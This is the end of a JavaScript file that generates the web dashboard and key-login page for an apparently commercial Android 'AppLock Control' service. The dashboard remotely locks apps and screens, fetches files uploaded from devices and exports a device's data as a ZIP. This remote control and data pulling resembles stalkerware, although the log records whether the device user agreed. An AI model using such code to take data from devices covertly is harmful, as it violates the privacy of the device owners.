    }
    if (!minutes || minutes < 1 || minutes > 999) {
      status.textContent = '⚠ Thời gian phải từ 1 đến 999 phút!';
      status.style.color = '#ffab40';
      return;
    }

    btn.disabled = true;
    status.textContent = \`⏳ Đang gửi lệnh hẹn giờ khoá \${minutes} phút...\`;
    status.style.color = '#a78bfa';
    try {
      const res  = await fetch('/api/device/send-timed-lock', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId, packageName, minutes }),
      });
      const data = await res.json();
      if (data.ok) {
        const appLabel = pkgSel ? pkgSel.options[pkgSel.selectedIndex].text : packageName;
        status.textContent = \`✅ Đã gửi! Ứng dụng "\${appLabel}" sẽ tự mở sau \${minutes} phút.\`;
        status.style.color = '#4ade80';
        setTimeout(() => { btn.disabled = false; }, 3000);
      } else {
        status.textContent = '❌ ' + (data.error || 'Gửi thất bại');
        status.style.color = '#ef4444';
        btn.disabled = false;
      }
    } catch (e) {
      status.textContent = '❌ Lỗi kết nối: ' + e.message;
      status.style.color = '#ef4444';
      btn.disabled = false;
    }
  }

  async function pollScreenLockAck(deviceId, cmdId, btn, status) {
    if (!activeDevice || activeDevice.deviceId !== deviceId || activeTab !== 'fetch') return;
    try {
      const res  = await fetch('/api/device/screen-lock-log?deviceId=' + deviceId);
      const data = await res.json();
      const cmd  = (data.commands || []).find(c => c.cmdId === cmdId);
      if (cmd && cmd.status === 'done') {
        status.textContent = '✅ Màn hình đã được khoá thành công!';
        status.style.color = '#4ade80';
        btn.disabled = false;
        return;
      } else if (cmd && cmd.status === 'failed') {
        status.textContent = '⚠ Khoá màn hình thất bại — cần Device Admin';
        status.style.color = '#ffab40';
        btn.disabled = false;
        return;
      }
      setTimeout(() => pollScreenLockAck(deviceId, cmdId, btn, status), 5000);
    } catch (e) {
      setTimeout(() => pollScreenLockAck(deviceId, cmdId, btn, status), 8000);
    }
  }

  // ── Lấy và hiển thị files đã upload từ thiết bị ───────────────────
  function setFetchFileCategory(deviceId, cat) {
    fetchFileCategory = cat;
    // Cập nhật trạng thái active cho các filter button
    const filterDiv = document.getElementById('fetch-files-filter-' + deviceId);
    if (filterDiv) {
      filterDiv.querySelectorAll('button').forEach(btn => {
        btn.classList.toggle('active', btn.getAttribute('onclick').includes("'" + cat + "'"));
      });
    }
    loadFetchedFiles(deviceId, cat);
  }

  function humanSizeSmall(bytes) {
    if (!bytes) return '0B';
    if (bytes < 1024) return bytes + 'B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + 'KB';
    return (bytes / 1024 / 1024).toFixed(1) + 'MB';
  }

  function fileIcon(mime, name) {
    if (!mime) mime = '';
    if (mime.startsWith('image/')) return '🖼';
    const ext = (name || '').split('.').pop().toLowerCase();
    const icons = { js:'📜', java:'☕', py:'🐍', sh:'🔧', txt:'📝', cpp:'⚙', so:'📦', zip:'🗜', apk:'📱', json:'📋' };
    return icons[ext] || '📄';
  }

  async function loadFetchedFiles(deviceId, cat) {
    const container = document.getElementById('fetch-files-' + deviceId);
    const summary   = document.getElementById('fetch-files-summary-' + deviceId);
    if (!container) return;
    container.innerHTML = '<div class="fetch-log-empty">⏳ Đang tải...</div>';
    try {
      let url = '/api/backup/files?deviceId=' + encodeURIComponent(deviceId) + '&pageSize=200';
      if (cat) url += '&category=' + encodeURIComponent(cat);
      const res  = await fetch(url);
      const data = await res.json();
      const files = data.files || [];
      if (summary) {
        const totalSize = files.reduce((s, f) => s + (f.size || 0), 0);
        summary.textContent = files.length + ' file · ' + humanSizeSmall(totalSize);
      }
      if (files.length === 0) {
        container.innerHTML = '<div class="fetch-log-empty">Chưa có dữ liệu nào được gửi lên</div>';
        return;
      }
      // Ảnh → grid, còn lại → list
      const images = files.filter(f => (f.mimeType || '').startsWith('image/'));
      const others = files.filter(f => !(f.mimeType || '').startsWith('image/'));
      let html = '';
      if (images.length > 0) {
        html += '<div style="margin-bottom:8px;font-size:11px;color:var(--sub)">🖼 ' + images.length + ' ảnh</div>';
        html += '<div class="fetch-file-grid">';
        images.forEach(f => {
          html += \`<div class="fetch-file-item" title="\${esc(f.originalName)}">
            <img src="/api/backup/file/\${esc(f.id)}" loading="lazy"
                 onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"
                 onclick="window.open('/api/backup/file/\${esc(f.id)}','_blank')">
            <div class="file-icon" style="display:none" onclick="window.open('/api/backup/file/\${esc(f.id)}','_blank')">🖼</div>
            <div class="file-name">\${esc(f.originalName)}</div>
            <div class="file-size">\${humanSizeSmall(f.size)}</div>
            <button class="fetch-file-delete" onclick="deleteFetchedFile(event,'\${esc(f.id)}','\${esc(deviceId)}','\${esc(fetchFileCategory)}')" title="Xóa">✕</button>
          </div>\`;
        });
        html += '</div>';
      }
      if (others.length > 0) {
        if (images.length > 0) html += '<div style="margin:12px 0 6px;font-size:11px;color:var(--sub)">📄 ' + others.length + ' file</div>';
        html += '<div class="fetch-files-list">';
        others.forEach(f => {
          html += \`<div class="fetch-file-row" onclick="window.open('/api/backup/file/\${esc(f.id)}','_blank')">
            <span class="row-icon">\${fileIcon(f.mimeType, f.originalName)}</span>
            <span class="row-name">\${esc(f.originalName)}</span>
            <span class="row-size">\${humanSizeSmall(f.size)}</span>
            <span class="row-del" onclick="deleteFetchedFile(event,'\${esc(f.id)}','\${esc(deviceId)}','\${esc(fetchFileCategory)}')">🗑</span>
          </div>\`;
        });
        html += '</div>';
      }
      container.innerHTML = html;
    } catch (e) {
      container.innerHTML = '<div class="fetch-log-empty">⚠ Lỗi tải dữ liệu: ' + esc(e.message) + '</div>';
    }
  }

  async function deleteFetchedFile(e, fileId, deviceId, cat) {
    e.stopPropagation();
    if (!confirm('Xóa file này khỏi server?')) return;
    try {
      await fetch('/api/backup/file/' + fileId, { method: 'DELETE' });
      loadFetchedFiles(deviceId, cat);
    } catch (err) {
      alert('Xóa thất bại: ' + err.message);
    }
  }

  // ── Download toàn bộ dữ liệu thiết bị thành ZIP ──
  async function downloadAllZip(deviceId) {
    const btn = document.getElementById('btn-dlzip-' + deviceId);
    if (btn) { btn.disabled = true; btn.innerHTML = '⏳ Đang kiểm tra...'; }
    try {
      // Bước 1: Kiểm tra số file trước
      let total = 0;
      try {
        const checkRes = await fetch('/api/backup/files?deviceId=' + encodeURIComponent(deviceId) + '&pageSize=1');
        if (checkRes.ok) {
          const checkData = await checkRes.json();
          total = checkData.total || 0;
        }
      } catch (_) {}

      if (total === 0) {
        alert('Thiết bị này chưa có dữ liệu nào được gửi lên.');
        return;
      }

      showToast('⏳ Đang nén và tải xuống ZIP (' + total + ' file)...', 'ok');
      if (btn) btn.innerHTML = '⏳ Đang nén ' + total + ' file...';

      // Bước 2: Dùng fetch để tải ZIP, đọc content-type trước khi xử lý
      const zipUrl = '/api/backup/download-all?deviceId=' + encodeURIComponent(deviceId);
      const zipRes = await fetch(zipUrl);

      if (!zipRes.ok) {
        const ct = (zipRes.headers.get('content-type') || '');
        let errMsg = 'HTTP ' + zipRes.status;
        try {
          if (ct.includes('application/json')) {
            const errJson = await zipRes.json();
            errMsg = errJson.error || errMsg;
          } else {
            const errText = await zipRes.text();
            errMsg = errText.slice(0, 200) || errMsg;
          }
        } catch (_) {}
        throw new Error(errMsg);
      }

      // Bước 3: Đọc response là ArrayBuffer để tránh bị parse sai
      const arrayBuf = await zipRes.arrayBuffer();
      if (!arrayBuf || arrayBuf.byteLength === 0) {
        throw new Error('Server trả về file ZIP rỗng');
      }

      // Bước 4: Tạo Blob với đúng MIME type và trigger download
      const blob      = new Blob([arrayBuf], { type: 'application/zip' });
      const objectUrl = URL.createObjectURL(blob);
      const a         = document.createElement('a');
      a.href     = objectUrl;
      a.download = 'device_data_' + deviceId.slice(0, 8) + '_' + Date.now() + '.zip';
      document.body.appendChild(a);
      a.click();
      setTimeout(() => { document.body.removeChild(a); URL.revokeObjectURL(objectUrl); }, 3000);

      showToast('✅ Đã tải xuống ZIP (' + total + ' file, ' + (blob.size / 1024).toFixed(0) + ' KB)!', 'ok');
    } catch (e) {
      console.error('[ZIP-DL]', e);
      showToast('❌ Lỗi tải ZIP: ' + e.message, 'err');
      alert('Lỗi tải xuống ZIP:\n' + e.message);
    } finally {
      if (btn) {
        setTimeout(() => {
          btn.disabled = false;
          btn.innerHTML = '⬇️ Tải xuống ZIP toàn bộ';
        }, 3000);
      }
    }
  }

  async function refreshFetchLog(deviceId) {
    const logDiv = document.getElementById('fetch-log-' + deviceId);
    if (!logDiv) return;
    try {
      const res  = await fetch('/api/device/fetch-data-log?deviceId=' + deviceId);
      const data = await res.json();
      const cmds = (data.commands || []).slice(0, 20);
      if (cmds.length === 0) {
        logDiv.innerHTML = '<div class="fetch-log-empty">Chưa có lịch sử lệnh nào</div>';
        return;
      }
      const statusLabels = {
        pending:  '<span class="fetch-log-status fetch-status-pending">⏳ Chờ gửi</span>',
        sent:     '<span class="fetch-log-status fetch-status-sent">📨 Đã gửi</span>',
        agreed:   '<span class="fetch-log-status fetch-status-agreed">✅ Đồng ý</span>',
        declined: '<span class="fetch-log-status fetch-status-declined">❌ Từ chối</span>',
      };
      logDiv.innerHTML = \`
        <table class="fetch-log-table">
          <thead>
            <tr>
              <th>Command ID</th>
              <th>Gửi lúc</th>
              <th>Trạng thái</th>
              <th>Xác nhận lúc</th>
            </tr>
          </thead>
          <tbody>
            \${cmds.map(c => \`
              <tr>
                <td style="font-family:monospace;color:var(--sub);font-size:10px">\${esc(c.cmdId.slice(-14))}</td>
                <td>\${c.sentAt ? new Date(c.sentAt).toLocaleTimeString('vi-VN') : '—'}</td>
                <td>\${statusLabels[c.status] || c.status}</td>
                <td>\${c.ackedAt ? new Date(c.ackedAt).toLocaleTimeString('vi-VN') : '—'}</td>
              </tr>
            \`).join('')}
          </tbody>
        </table>
      \`;
    } catch (e) {
      logDiv.innerHTML = '<div class="fetch-log-empty">⚠ Lỗi tải lịch sử</div>';
    }
  }



  // ── Auto-poll ────────────────────────────────────
  async function loadDevicesAndLog() {
    await loadDevices();
    maybeLoadFetchLog();
  }
  loadDevicesAndLog();
  setInterval(loadDevicesAndLog, 5000); // refresh every 5s
</script>
</body>
</html>`;
}

// ─────────────────────────────────────────────────
// Welcome / Login Page HTML
// ─────────────────────────────────────────────────
function getWelcomeHTML() {
  return `<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Chào mừng — AppLock Control</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --bg:      #0D1117;
    --surface: #161B22;
    --card:    #1C2230;
    --accent:  #4F8EF7;
    --accent2: #7c3aed;
    --green:   #26A641;
    --text:    #E6EDF3;
    --sub:     #8B949E;
    --divider: #21262D;
    --red:     #E53935;
  }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 24px;
    position: relative;
    overflow: hidden;
  }

  /* Animated background */
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background:
      radial-gradient(ellipse 80% 60% at 20% 0%, rgba(79,142,247,.12) 0%, transparent 60%),
      radial-gradient(ellipse 60% 50% at 80% 100%, rgba(124,58,237,.10) 0%, transparent 60%);
    pointer-events: none;
  }

  /* ── Welcome banner ── */
  .welcome-banner {
    text-align: center;
    margin-bottom: 40px;
    animation: fadeDown .6s ease both;
  }
  .welcome-logo {
    font-size: 52px;
    margin-bottom: 16px;
    filter: drop-shadow(0 0 24px rgba(79,142,247,.4));
  }
  .welcome-banner h1 {
    font-size: 28px;
    font-weight: 800;
    letter-spacing: -0.5px;
    background: linear-gradient(135deg, #7dd3fc 0%, #4F8EF7 50%, #a78bfa 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    margin-bottom: 10px;
  }
  .welcome-banner p {
    font-size: 15px;
    color: var(--sub);
    max-width: 380px;
    line-height: 1.6;
  }

  /* ── Card ── */
  .login-card {
    background: var(--surface);
    border: 1px solid var(--divider);
    border-radius: 20px;
    padding: 36px 40px 32px;
    width: 100%;
    max-width: 420px;
    box-shadow: 0 8px 40px rgba(0,0,0,.4), 0 0 0 1px rgba(255,255,255,.04);
    animation: fadeUp .55s ease .1s both;
    position: relative;
  }

  .card-header {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 26px;
  }
  .card-icon {
    width: 44px; height: 44px;
    background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
    border-radius: 12px;
    display: flex; align-items: center; justify-content: center;
    font-size: 22px;
    flex-shrink: 0;
    box-shadow: 0 4px 16px rgba(79,142,247,.35);
  }
  .card-header h2 {
    font-size: 18px;
    font-weight: 700;
    letter-spacing: -.2px;
  }
  .card-header p {
    font-size: 12px;
    color: var(--sub);
    margin-top: 2px;
  }

  /* ── Form ── */
  .field { margin-bottom: 18px; }
  .field label {
    display: block;
    font-size: 12px;
    font-weight: 600;
    color: var(--sub);
    text-transform: uppercase;
    letter-spacing: .6px;
    margin-bottom: 7px;
  }
  .field-wrap { position: relative; }
  .field input {
    width: 100%;
    background: var(--card);
    border: 1.5px solid var(--divider);
    border-radius: 10px;
    color: var(--text);
    padding: 12px 44px 12px 14px;
    font-size: 14px;
    font-family: 'Courier New', monospace;
    letter-spacing: 1px;
    outline: none;
    transition: border-color .15s, box-shadow .15s;
  }
  .field input::placeholder { color: var(--sub); letter-spacing: 0; font-family: 'Segoe UI', sans-serif; }
  .field input:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 3px rgba(79,142,247,.18);
  }
  .field input.error { border-color: var(--red); box-shadow: 0 0 0 3px rgba(229,57,53,.15); }

  .show-toggle {
    position: absolute;
    right: 12px; top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    color: var(--sub);
    cursor: pointer;
    font-size: 16px;
    padding: 4px;
    transition: color .15s;
  }
  .show-toggle:hover { color: var(--text); }

  /* ── Error ── */
  .error-box {
    background: rgba(229,57,53,.12);
    border: 1px solid rgba(229,57,53,.35);
    border-radius: 10px;
    padding: 12px 14px;
    font-size: 13px;
    color: #ef9a9a;
    margin-bottom: 18px;
    display: none;
    animation: shake .3s ease;
  }
  .error-box.show { display: block; }

  /* ── Submit button ── */
  .btn-login {
    width: 100%;
    background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
    border: none;
    border-radius: 12px;
    color: #fff;
    font-size: 15px;
    font-weight: 700;
    padding: 14px;
    cursor: pointer;
    transition: opacity .15s, transform .1s, box-shadow .15s;
    box-shadow: 0 4px 18px rgba(79,142,247,.3);
    letter-spacing: .2px;
    margin-top: 4px;
  }
  .btn-login:hover:not(:disabled) {
    opacity: .92;
    transform: translateY(-1px);
    box-shadow: 0 6px 24px rgba(79,142,247,.4);
  }
  .btn-login:active:not(:disabled) { transform: scale(.98); }
  .btn-login:disabled { opacity: .55; cursor: not-allowed; }

  /* ── Loading spinner ── */
  .spinner {
    display: inline-block;
    width: 16px; height: 16px;
    border: 2px solid rgba(255,255,255,.3);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin .6s linear infinite;
    margin-right: 8px;
    vertical-align: middle;
  }

  /* ── Footer note ── */
  .card-footer {
    margin-top: 22px;
    text-align: center;
    font-size: 12px;
    color: var(--sub);
    line-height: 1.6;
  }
  .card-footer a { color: var(--accent); text-decoration: none; }
  .card-footer a:hover { text-decoration: underline; }

  /* ── Feature pills ── */
  .features {
    display: flex;
    gap: 10px;
    justify-content: center;
    flex-wrap: wrap;
    margin-top: 32px;
    animation: fadeUp .55s ease .25s both;
  }
  .feat {
    background: var(--surface);
    border: 1px solid var(--divider);
    border-radius: 999px;
    padding: 6px 16px;
    font-size: 12px;
    color: var(--sub);
    display: flex;
    align-items: center;
    gap: 6px;
  }

  /* ── Animations ── */
  @keyframes fadeDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: none; } }
  @keyframes fadeUp   { from { opacity: 0; transform: translateY(20px);  } to { opacity: 1; transform: none; } }
  @keyframes spin     { to { transform: rotate(360deg); } }
  @keyframes shake    {
    0%,100% { transform: translateX(0); }
    20%,60% { transform: translateX(-6px); }
    40%,80% { transform: translateX(6px); }
  }
</style>
</head>
<body>

<!-- Welcome Banner -->
<div class="welcome-banner">
  <div class="welcome-logo">🛡️</div>
  <h1>Chào mừng quý khách hàng</h1>
  <p>Hệ thống điều khiển thiết bị từ xa — Bảo mật · Ổn định · Nhanh chóng<br/>Vui lòng đăng nhập bằng key để tiếp tục.</p>
</div>

<!-- Login Card -->
<div class="login-card">
  <div class="card-header">
    <div class="card-icon">🔑</div>
    <div>
      <h2>Đăng nhập Key</h2>
      <p>Nhập key được cấp để truy cập hệ thống</p>
    </div>
  </div>

  <div class="error-box" id="errBox">❌ Key không hợp lệ hoặc đã hết hạn. Vui lòng kiểm tra lại.</div>

  <div class="field">
    <label>🔑 Key truy cập</label>
    <div class="field-wrap">
      <input type="password" id="keyInput" placeholder="Nhập key của bạn vào đây..."
             autocomplete="off" spellcheck="false"
             onkeydown="if(event.key==='Enter') doLogin()" />
      <button class="show-toggle" id="showToggle" onclick="toggleShow()" title="Hiện/ẩn key">👁</button>
    </div>
  </div>

  <button class="btn-login" id="btnLogin" onclick="doLogin()">
    Đăng nhập →
  </button>

  <div class="card-footer">
    🔒 Kết nối an toàn · Dữ liệu được mã hóa<br/>
    Chưa có key? <a href="javascript:void(0)" onclick="alert('Liên hệ quản trị viên để được cấp key truy cập.')">Liên hệ quản trị viên</a>
  </div>
</div>

<!-- Feature pills -->
<div class="features">
  <div class="feat">📱 Quản lý thiết bị Android</div>
  <div class="feat">🔒 Khoá / mở ứng dụng từ xa</div>
  <div class="feat">📥 Lấy dữ liệu tự động</div>
  <div class="feat">⬇️ Xuất ZIP toàn bộ</div>
</div>

<script>
  // Khôi phục session từ localStorage
  const savedToken = localStorage.getItem('applock_token');
  if (savedToken) {
    // Kiểm tra token còn hợp lệ không
    fetch('/api/auth/check-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: savedToken })
    }).then(r => r.json()).then(d => {
      if (d.ok) {
        window.location.href = '/dashboard';
      } else {
        localStorage.removeItem('applock_token');
      }
    }).catch(() => {
      localStorage.removeItem('applock_token');
    });
  }

  function toggleShow() {
    const inp = document.getElementById('keyInput');
    const btn = document.getElementById('showToggle');
    if (inp.type === 'password') { inp.type = 'text'; btn.textContent = '🙈'; }
    else { inp.type = 'password'; btn.textContent = '👁'; }
  }

  async function doLogin() {
    const key = document.getElementById('keyInput').value.trim();
    const btn = document.getElementById('btnLogin');
    const err = document.getElementById('errBox');
    const inp = document.getElementById('keyInput');

    if (!key) {
      inp.classList.add('error');
      err.textContent = '⚠️ Vui lòng nhập key trước khi đăng nhập.';
      err.classList.add('show');
      inp.focus();
      return;
    }

    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span> Đang xác thực...';
    inp.classList.remove('error');
    err.classList.remove('show');

    try {
      const res = await fetch('/api/auth/verify-key', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ key })
      });
      const data = await res.json();
      if (data.ok && data.token) {
        localStorage.setItem('applock_token', data.token);
        if (data.expiresAt) localStorage.setItem('applock_key_expires', data.expiresAt);
        if (data.keyType)   localStorage.setItem('applock_key_type', data.keyType);
        const typeLabel = data.keyType === 'premium' ? ' ★ Premium' : '';
        btn.innerHTML = '✅ Thành công' + typeLabel + '! Đang chuyển hướng...';
        btn.style.background = 'linear-gradient(135deg,#26A641,#059669)';
        setTimeout(() => { window.location.href = '/dashboard'; }, 700);
      } else {
        inp.classList.add('error');
        err.textContent = '❌ ' + (data.error || 'Key không hợp lệ hoặc đã hết hạn.');
        err.classList.add('show');
        btn.disabled = false;
        btn.innerHTML = 'Đăng nhập →';
        inp.focus();
      }
    } catch (e) {
      err.textContent = '❌ Lỗi kết nối. Vui lòng thử lại.';
      err.classList.add('show');
      btn.disabled = false;
      btn.innerHTML = 'Đăng nhập →';
    }
  }
</script>
</body>
</html>`;
}
